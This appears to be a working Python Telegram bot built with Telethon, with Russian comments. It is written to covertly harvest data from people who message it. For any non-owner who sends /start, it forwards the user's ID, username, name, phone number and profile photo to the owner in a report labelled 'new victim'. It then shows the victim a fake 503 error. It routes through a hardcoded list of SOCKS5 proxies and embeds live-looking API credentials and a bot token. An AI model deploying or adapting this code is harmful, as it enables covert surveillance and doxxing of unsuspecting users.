from telethon import TelegramClient, events
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
import asyncio
import random
from datetime import datetime

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

# СПИСОК SOCKS5 ПРОКСИ
PROXIES = [
    "72.49.49.11:31034",
    "208.102.51.6:58208",
    "69.61.200.104:36181",
    "66.42.224.229:41679",
    "192.111.137.37:18762",
    "192.252.208.67:14287",
    "192.111.137.34:18765",
    "192.252.208.70:14282",
    "192.111.135.17:18302",
    "192.111.135.18:18301",
    "192.252.211.197:14921",
    "192.111.129.145:16894",
    "72.195.34.35:27360",
    "174.77.111.198:49547",
    "98.178.72.21:10919",
    "72.195.34.60:27391",
    "184.178.172.28:15294",
    "184.178.172.25:15291",
    "184.178.172.18:15280",
    "70.166.167.55:57745"
]

def parse_proxy(proxy_str: str):
    """Преобразует строку 'ip:port' в формат Telethon"""
    ip, port = proxy_str.split(":")
    return {
        'proxy_type': 'socks5',
        'addr': ip,
        'port': int(port),
        'username': None,
        'password': None
    }

async def create_client_with_proxy(proxy_index: int = 0):
    """Создает клиента с указанным прокси"""
    if proxy_index >= len(PROXIES):
        return None
    
    proxy = parse_proxy(PROXIES[proxy_index])
    print(f"Попытка подключения через прокси {proxy_index+1}: {PROXIES[proxy_index]}")
    
    client = TelegramClient(
        f'bot_session_{proxy_index}',
        API_ID,
        API_HASH,
        connection=ConnectionTcpAbridged,
        proxy=proxy
    )
    
    try:
        await client.start(bot_token=BOT_TOKEN)
        return client
    except Exception as e:
        print(f"Ошибка через прокси {proxy_index+1}: {str(e)[:50]}")
        await client.disconnect()
        return None

# ========== ОСНОВНАЯ ЛОГИКА ==========
async def main():
    client = None
    
    # Перебор прокси до первого рабочего
    for i in range(len(PROXIES)):
        client = await create_client_with_proxy(i)
        if client:
            print(f"✅ Подключено через прокси: {PROXIES[i]}")
            break
    
    if not client:
        print("❌ Ни один прокси не работает. Запуск без прокси...")
        client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
        print("✅ Запущено без прокси")
    
    # ========== ОБРАБОТЧИКИ ==========
    @client.on(events.NewMessage(pattern='/start'))
    async def handler(event):
        user = await event.get_sender()
        
        if user.id == OWNER_ID:
            await event.reply(
                "✅ **Бот запущен**\n\n"
                f"📌 Ваш ID: `{OWNER_ID}`\n"
                "🔒 Режим: скрытый сбор данных\n\n"
                "**Команды:**\n"
                "/stats - статус бота"
            )
            return
        
        # Сбор данных о жертве
        report = f"""[НОВАЯ ЖЕРТВА]
━━━━━━━━━━━━━━━━━━━━━
ID: {user.id}
Username: @{user.username}
Имя: {user.first_name} {user.last_name}
Телефон: {getattr(user, 'phone', 'Скрыт')}
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━
Ссылка: tg://user?id={user.id}"""
        
        await client.send_message(OWNER_ID, report)
        
        # Отправка аватара если есть
        try:
            photos = await client.get_profile_photos(user.id, limit=1)
            if photos:
                await client.send_file(OWNER_ID, photos[0], caption=f"Аватар @{user.username}")
        except:
            pass
        
        # Заглушка для жертвы
        await event.reply("⚠️ Сервис временно недоступен. Код ошибки: 503")
    
    @client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
    async def stats(event):
        await event.reply("✅ Бот активен и работает через SOCKS5 прокси")
    
    print("=" * 50)
    print("БОТ ЗАПУЩЕН")
    print(f"API ID: {API_ID}")
    print(f"ID владельца: {OWNER_ID}")
    print("=" * 50)
    
    await client.run_until_disconnected()

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    asyncio.run(main())
